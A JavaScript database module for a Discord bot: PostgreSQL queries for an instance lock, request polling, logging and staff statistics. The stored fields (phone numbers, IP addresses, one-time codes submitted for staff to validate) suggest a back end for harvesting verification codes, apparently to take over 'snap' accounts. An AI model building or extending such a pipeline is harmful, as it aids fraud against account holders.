/**
 * database.js — Neon PostgreSQL queries
 */

import os from "node:os";
import { neon } from "@neondatabase/serverless";
import { CONFIG } from "./config.js";

export const sql = neon(CONFIG.DATABASE_URL);

// ─── Single-instance lock ──────────────────────────────────────────────────────
//
// Guards against two bot processes (e.g. an orphaned process from a bad
// restart) both logging into Discord with the same token and both trying to
// handle every button interaction — which is exactly what produces a storm
// of "Unknown interaction" / "already acknowledged" errors (only one of the
// two racing processes can win each ack).
//
// One row, id=1. Whoever holds a fresh (recently-renewed) heartbeat owns the
// lock. The acquire query is a single atomic UPSERT — its WHERE clause only
// lets the update through if the existing lock is stale, so two processes
// starting at the same instant can't both succeed (Postgres row-locks the
// row during the UPDATE, so they're serialized and only the first sees a
// stale row).

async function ensureLockTable() {
    await sql`
        CREATE TABLE IF NOT EXISTS bot_instance_lock (
            id             INTEGER PRIMARY KEY DEFAULT 1,
            instance_id    TEXT NOT NULL,
            hostname       TEXT,
            pid            INTEGER,
            started_at     TIMESTAMPTZ NOT NULL DEFAULT now(),
            last_heartbeat TIMESTAMPTZ NOT NULL DEFAULT now(),
            CONSTRAINT bot_instance_lock_single_row CHECK (id = 1)
        )
    `;
}

/**
 * Attempts to become the single active instance.
 * @returns {Promise<{acquired: true} | {acquired: false, heldBy: object}>}
 */
export async function acquireInstanceLock(instanceId, staleAfterSeconds = 30) {
    await ensureLockTable();

    const rows = await sql`
        INSERT INTO bot_instance_lock (id, instance_id, hostname, pid, started_at, last_heartbeat)
        VALUES (1, ${instanceId}, ${os.hostname()}, ${process.pid}, now(), now())
        ON CONFLICT (id) DO UPDATE
            SET instance_id    = EXCLUDED.instance_id,
                hostname       = EXCLUDED.hostname,
                pid            = EXCLUDED.pid,
                started_at     = now(),
                last_heartbeat = now()
        WHERE bot_instance_lock.last_heartbeat < now() - (${staleAfterSeconds}::text || ' seconds')::interval
        RETURNING instance_id, started_at
    `;

    if (rows.length > 0) return { acquired: true };

    const [current] = await sql`
        SELECT instance_id, hostname, pid, started_at, last_heartbeat FROM bot_instance_lock WHERE id = 1
    `;
    return { acquired: false, heldBy: current };
}

/**
 * Refreshes our heartbeat. Returns false if we no longer hold the lock
 * (someone else's instance_id is now in the row) — the caller must then
 * shut down immediately to stop handling interactions in parallel with
 * whoever took over.
 */
export async function renewInstanceLock(instanceId) {
    const rows = await sql`
        UPDATE bot_instance_lock
        SET last_heartbeat = now()
        WHERE id = 1 AND instance_id = ${instanceId}
        RETURNING instance_id
    `;
    return rows.length > 0;
}

/** Best-effort release on graceful shutdown, so a fast restart doesn't have to wait out the stale timeout. */
export async function releaseInstanceLock(instanceId) {
    try {
        await sql`DELETE FROM bot_instance_lock WHERE id = 1 AND instance_id = ${instanceId}`;
    } catch { /* best-effort */ }
}

// ─── Single-row lookups ───────────────────────────────────────────────────────

export async function getRequestByPhone(phone) {
    const rows = await sql`
        SELECT * FROM snap_requests WHERE phone = ${phone} LIMIT 1
    `;
    return rows[0] || null;
}

/**
 * Returns the Discord user ID of whoever claimed this request.
 * Used as fallback when the in-memory claimedBy Map is empty (bot restart).
 * Requires the claimed_by_discord_id column (migration_v2.2.sql).
 */
export async function getClaimedBy(phone) {
    const rows = await sql`
        SELECT claimed_by_discord_id FROM snap_requests WHERE phone = ${phone} LIMIT 1
    `;
    return rows[0]?.claimed_by_discord_id ?? null;
}

export async function updateStatus(phone, status) {
    await sql`UPDATE snap_requests SET status = ${status} WHERE phone = ${phone}`;
}

// ─── Logging ──────────────────────────────────────────────────────────────────

export async function logAction(action, details) {
    try {
        await sql`
            INSERT INTO snap_logs (action, details)
            VALUES (${action}, ${JSON.stringify(details)})
        `;
    } catch {
        // snap_logs may not exist in older deployments — non-fatal
    }
}

// ─── Polling queries ──────────────────────────────────────────────────────────

/**
 * Returns pending requests updated after `since`.
 * Timestamp-based (like getCodeSubmittedRequests) so a request that gets
 * reset back to 'pending' on an EXISTING row (e.g. re-submitted after
 * wrong_number, or a safe upsert reset) is detected too — not just brand
 * new INSERTs. An id-based cursor misses these, leaving the request stuck
 * invisible in the DB while the old Discord message goes stale.
 */
export async function getPendingRequests(since) {
    return await sql`
        SELECT id, username, phone, operator, country, city, ip_address, status, created_at, updated_at
        FROM snap_requests
        WHERE status = ${"pending"} AND updated_at > ${since.toISOString()}
        ORDER BY updated_at ASC
    `;
}

/**
 * Returns code_submitted requests updated after `since`.
 * Timestamp-based so retries (same row, new UPDATE) are detected.
 */
export async function getCodeSubmittedRequests(since) {
    return await sql`
        SELECT id, username, phone, operator, country, city, ip_address,
               staff_code, code_length, status, created_at, updated_at
        FROM snap_requests
        WHERE status = ${"code_submitted"}
          AND staff_code IS NOT NULL
          AND updated_at > ${since.toISOString()}
        ORDER BY updated_at ASC
    `;
}

// ─── Stats queries ────────────────────────────────────────────────────────────

export async function getGlobalStats() {
    const [totals] = await sql`
        SELECT
            COUNT(*)                                              AS total,
            COUNT(*) FILTER (WHERE status = 'pending')           AS pending,
            COUNT(*) FILTER (WHERE status = 'processing')        AS processing,
            COUNT(*) FILTER (WHERE status = 'waiting_code')      AS waiting,
            COUNT(*) FILTER (WHERE status = 'code_submitted')    AS submitted,
            COUNT(*) FILTER (WHERE status = 'completed')         AS completed,
            COUNT(*) FILTER (WHERE status = 'wrong_number')      AS wrong,
            COUNT(*) FILTER (WHERE status = 'retry_code')        AS retry
        FROM snap_requests
    `;
    const [banRow] = await sql`SELECT COUNT(*) AS count FROM banned_ips`;
    return { ...totals, banned: banRow.count };
}

export async function getTodayStats() {
    const [today] = await sql`
        SELECT
            COUNT(*)                                         AS requests,
            COUNT(*) FILTER (WHERE status = 'completed')    AS completed
        FROM snap_requests
        WHERE created_at >= CURRENT_DATE
    `;
    return today;
}

export async function getOperatorStats() {
    return await sql`
        SELECT operator, COUNT(*) AS count
        FROM snap_requests
        GROUP BY operator
        ORDER BY count DESC
    `;
}

export async function getHourlyStats() {
    return await sql`
        SELECT EXTRACT(HOUR FROM created_at) AS hour, COUNT(*) AS count
        FROM snap_requests
        WHERE created_at >= NOW() - INTERVAL '24 hours'
        GROUP BY hour
        ORDER BY hour
    `;
}

export async function getStaffLeaderboard(limit = 10) {
    return await sql`
        SELECT
            details->>'staff_tag' AS staff,
            COUNT(*)              AS validations
        FROM snap_logs
        WHERE action = ${"true_code"}
          AND details->>'staff_tag' IS NOT NULL
        GROUP BY details->>'staff_tag'
        ORDER BY validations DESC
        LIMIT ${limit}
    `;
}

export async function getStaffActivity() {
    return await sql`
        SELECT
            details->>'staff_tag' AS staff,
            action,
            COUNT(*)              AS count
        FROM snap_logs
        WHERE details->>'staff_tag' IS NOT NULL
        GROUP BY details->>'staff_tag', action
        ORDER BY count DESC
    `;
}
